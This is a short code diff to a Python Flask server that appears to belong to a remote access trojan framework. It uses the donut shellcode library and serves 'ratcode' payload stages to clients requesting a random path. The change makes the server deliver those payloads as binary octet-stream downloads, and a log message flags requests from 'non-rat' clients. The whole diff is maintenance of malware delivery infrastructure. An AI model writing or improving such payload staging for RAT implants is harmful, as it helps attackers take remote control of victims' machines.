@@ -6,7 +6,7 @@ from resources import ekript
 import sys
 # Check for existance of 'donut-python' and 'flask'
 try:
-    from flask import Flask, request, redirect
+    from flask import Flask, request, redirect, Response
     import donut
 except ImportError as ie:
     print("Error: Libraries are missing -> \r\n{}".format(ie))
@@ -606,7 +606,9 @@ def serve_server(port=8080):
         ip_addr = request.environ['REMOTE_ADDR']
         if(str.startswith(path, rand_path + "/b.") and not disable_staging):
             ratType = ".".join(path.split(".")[1:])
-            return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
+            resp = Response(send_ratcode(ratType=ratType, ip_addr=ip_addr))
+            resp.headers['Content-type'] = 'application/octet-stream'
+            return(resp)
         elif(verbose):
             pretty_print("[v] GET request from non-rat client requested path /" + path)
         return(default_page())
